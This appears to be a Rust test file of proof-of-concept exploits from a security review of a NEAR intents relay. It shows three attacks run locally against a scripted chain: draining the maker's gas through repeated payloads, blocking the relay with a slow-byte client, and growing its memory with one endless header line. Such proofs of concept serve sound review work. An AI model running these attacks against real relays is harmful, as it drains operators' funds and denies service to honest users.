// Security review 3: proofs of concept for the maker's relay (crates/zecret-node/src/relay.rs).
//
// Both tests run with no network. They fail (assert) on the reviewed code and pass once
// the findings are fixed.
//
//   poc_f3_01_any_request_sender_drains_relay_gas
//       F3-01. A signer that appears in any swap record of the maker (a record is created
//       for every request memo that passes the format checks, before any premium is paid,
//       and is never removed) can make the relay send execute_intents again and again,
//       one transaction per fresh nonce, each paid by the maker. A scripted NEAR RPC
//       stands in for the network and counts the transactions the relay sends.
//
//   poc_f3_02_one_slow_client_blocks_the_relay
//       F3-02. The relay serves one connection at a time and only bounds each read to
//       10 s. A client that sends one byte every 2 s keeps the relay busy for as long as
//       it wants; a second client (an honest taker) gets no answer meanwhile.
//
// How to run (from a scratch workspace, so that nothing in crates/ changes):
//   1. A crate with dependencies zecret-core and zecret-node by path, anyhow, serde_json,
//      hex, and `[profile.dev] opt-level = 3`; copy crates/Cargo.lock next to it.
//   2. Put this file in its tests/ directory.
//   3. CARGO_TARGET_DIR=<repo>/crates/target cargo test --test relay_pocs -- --nocapture --test-threads=1

use std::{
    cell::RefCell,
    io::{Read, Write},
    net::{TcpListener, TcpStream},
    rc::Rc,
    time::{Duration, Instant},
};

use anyhow::Result;
use serde_json::{json, Value};
use zecret_core::{
    near::{NearKey, NearRpc, Signer},
    net::{Response, Transport},
    store::put_json,
};
use zecret_node::{io::FileStore, relay::Relay};

/// A NEAR JSON-RPC that accepts every simulate_intents and executes every transaction.
struct Chain {
    sent: RefCell<usize>,
}

impl Transport for Chain {
    fn post(&self, _url: &str, _h: &[(&str, &str)], body: &[u8]) -> Result<Response> {
        let req: Value = serde_json::from_slice(body)?;
        let p = &req["params"];
        let result = match req["method"].as_str().unwrap_or("") {
            "query" if p["request_type"] == "call_function" => {
                // simulate_intents: the Verifier accepts (a payload with no intents, or an
                // add_public_key / remove_public_key pair, is valid and moves nothing).
                let bytes: Vec<u8> = serde_json::to_vec(&json!({"intents_executed": [], "logs": []}))?;
                json!({"result": bytes, "logs": [], "block_height": 1, "block_hash": "11111111111111111111111111111111"})
            }
            "query" if p["request_type"] == "view_access_key" => json!({"nonce": 100 + *self.sent.borrow() as u64, "permission": "FullAccess", "block_height": 1, "block_hash": "11111111111111111111111111111111"}),
            "block" => json!({"header": {"hash": "4vJ9JU1bJJE96FWSJKvHsmmFADCg4gpZQff4P3bkLKi", "height": 1000, "timestamp": 1_800_000_000u64 * 1_000_000_000}}),
            "send_tx" => {
                *self.sent.borrow_mut() += 1;
                json!({
                    "final_execution_status": "EXECUTED",
                    "status": {"SuccessValue": ""},
                    "transaction_outcome": {"outcome": {"logs": [], "status": {"SuccessReceiptId": "x"}, "executor_id": "maker.test"}},
                    "receipts_outcome": [{"outcome": {"logs": [], "status": {"SuccessValue": ""}, "executor_id": "intents.test"}}]
                })
            }
            m => anyhow::bail!("unexpected RPC {m} {p}"),
        };
        Ok(Response { status: 200, body: serde_json::to_vec(&json!({"jsonrpc": "2.0", "id": 1, "result": result}))?, headers: vec![] })
    }
}

fn scratch_dir(name: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("zecret-poc3-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn relay(dir: &std::path::Path) -> Relay {
    Relay { near_rpc: "http://near.invalid".into(), verifier: "intents.test".into(), maker_account: "maker.test".into(), key: NearKey::from_seed([9; 32]), store_dir: dir.to_path_buf() }
}

/// A raw_ed25519 payload of `signer` with a fresh nonce and no intents. The relay does
/// not check the signature itself; simulate_intents does (accepted by the scripted RPC,
/// as the real Verifier accepts a correctly signed payload of the account's own key).
fn payload(signer: &str, i: u32) -> Vec<u8> {
    let inner = json!({"signer_id": signer, "verifying_contract": "intents.test", "deadline": "2030-01-01T00:00:00Z", "nonce": format!("nonce-{i}"), "intents": []});
    json!({"signed": [{"standard": "raw_ed25519", "payload": inner.to_string(), "public_key": "ed25519:x", "signature": "ed25519:y"}]}).to_string().into_bytes()
}

#[test]
fn poc_f3_01_any_request_sender_drains_relay_gas() {
    let dir = scratch_dir("gas");
    // What the maker stores when a stranger's request memo arrives (maker.rs, on the
    // request: `MakerSwap { stage: Quoting, taker_account: hex(rfq.taker_pk), .. }`),
    // then later expired: no premium, no escrow, no stipend. The relay reads only
    // `taker_account`.
    let attacker = NearKey::from_seed([66; 32]).implicit_account();
    {
        let mut st = FileStore::new(&dir).unwrap();
        put_json(&mut st, "swap/00112233445566778899aabbccddeeff", &json!({"rfq_id": "00112233445566778899aabbccddeeff", "stage": {"Aborted": "request expired"}, "taker_account": attacker, "price": "1", "premium": 0})).unwrap();
    }
    let chain = Rc::new(Chain { sent: RefCell::new(0) });
    let rpc = NearRpc::new(chain.clone(), "http://near.invalid");
    let r = relay(&dir);
    let signer = Signer::new("maker.test", r.key.clone());
    let n = 25;
    let mut ok = 0;
    for i in 0..n {
        if let Ok(v) = r.handle(&rpc, &signer, &payload(&attacker, i))
            && v["ok"] == true
        {
            ok += 1;
        }
    }
    let sent = *chain.sent.borrow();
    println!("F3-01: {ok} of {n} payloads of a never-paid requester relayed; the maker signed and paid for {sent} execute_intents (50 Tgas attached each)");
    // A stranger is refused (the existing check), for comparison.
    let stranger = NearKey::from_seed([77; 32]).implicit_account();
    assert!(r.handle(&rpc, &signer, &payload(&stranger, 0)).is_err());
    // The invariant the relay claims: it pays only for its takers' exits, at most once per
    // swap that paid out. Here nothing was paid out and the maker paid n times.
    assert!(sent <= 1, "the relay sent {sent} execute_intents for a requester that never paid a premium");
}

fn free_port() -> u16 {
    TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port()
}

#[test]
fn poc_f3_02_one_slow_client_blocks_the_relay() {
    let dir = scratch_dir("slow");
    let port = free_port();
    let addr = format!("127.0.0.1:{port}");
    let r = relay(&dir);
    let a = addr.clone();
    std::thread::spawn(move || {
        let _ = r.serve(&a);
    });
    std::thread::sleep(Duration::from_millis(300));

    // The slow client: a request line, then one header byte every 2 s for 20 s.
    let a = addr.clone();
    let slow = std::thread::spawn(move || {
        let mut s = TcpStream::connect(&a).unwrap();
        s.write_all(b"POST /execute-intents HTTP/1.1\r\nx-slow: ").unwrap();
        for _ in 0..10 {
            std::thread::sleep(Duration::from_secs(2));
            if s.write_all(b"a").is_err() {
                return;
            }
        }
    });
    std::thread::sleep(Duration::from_millis(300));

    // An honest client: a CORS preflight, answered at once by an idle relay.
    let mut s = TcpStream::connect(&addr).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(12))).unwrap();
    s.write_all(b"OPTIONS /execute-intents HTTP/1.1\r\nhost: x\r\n\r\n").unwrap();
    let t = Instant::now();
    let mut buf = [0u8; 64];
    let got = s.read(&mut buf);
    let waited = t.elapsed();
    println!("F3-02: honest preflight answered after {waited:?}: {:?}", got.as_ref().map(|n| String::from_utf8_lossy(&buf[..*n]).lines().next().unwrap_or("").to_string()));
    slow.join().unwrap();
    assert!(got.is_ok() && waited < Duration::from_secs(2), "one client that sends a byte every 2 s kept the relay from answering anyone for {waited:?}");
}

fn rss_mib() -> u64 {
    let s = std::fs::read_to_string("/proc/self/status").unwrap();
    let kb: u64 = s.lines().find(|l| l.starts_with("VmRSS:")).unwrap().split_whitespace().nth(1).unwrap().parse().unwrap();
    kb / 1024
}

#[test]
fn poc_f3_02b_one_header_line_grows_the_maker_process() {
    // F3-02, memory: read_line has no length limit, and the 64 KiB body limit is checked
    // only after all headers are read. One connection that streams a header line with no
    // newline grows a String inside the maker process (the relay is a thread of
    // `zecret maker`) for as long as it streams. Bounded here at 256 MiB.
    let dir = scratch_dir("mem");
    let port = free_port();
    let addr = format!("127.0.0.1:{port}");
    let r = relay(&dir);
    let a = addr.clone();
    std::thread::spawn(move || {
        let _ = r.serve(&a);
    });
    std::thread::sleep(Duration::from_millis(300));
    let before = rss_mib();
    let mut s = TcpStream::connect(&addr).unwrap();
    s.write_all(b"POST /execute-intents HTTP/1.1\r\nx-big: ").unwrap();
    let chunk = vec![b'a'; 1 << 20];
    for _ in 0..256 {
        s.write_all(&chunk).unwrap();
    }
    std::thread::sleep(Duration::from_millis(500));
    let after = rss_mib();
    println!("F3-02b: maker process RSS {before} MiB -> {after} MiB after one 256 MiB header line");
    drop(s);
    assert!(after < before + 16, "one header line grew the maker process by {} MiB", after.saturating_sub(before));
}
